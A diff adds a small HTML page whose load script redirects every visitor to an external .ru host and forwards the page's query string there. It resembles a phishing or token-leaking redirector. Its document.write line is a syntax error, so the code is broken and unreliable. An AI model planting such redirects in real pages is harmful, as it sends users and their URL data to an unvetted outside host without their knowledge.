@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <script type="text/javascript">
+    window.onload = function(){
+      if(document.location.search.length) {
+        document.location.href = 'http://domiktoriel.myjino.ru/?' + document.location.search;
+      } else {
+        document.location.href = 'http://domiktoriel.myjino.ru/';
+      }    
+      document.write(<h1>"test"</h1>);
+    }
+  </script>
+</head>
+</html>
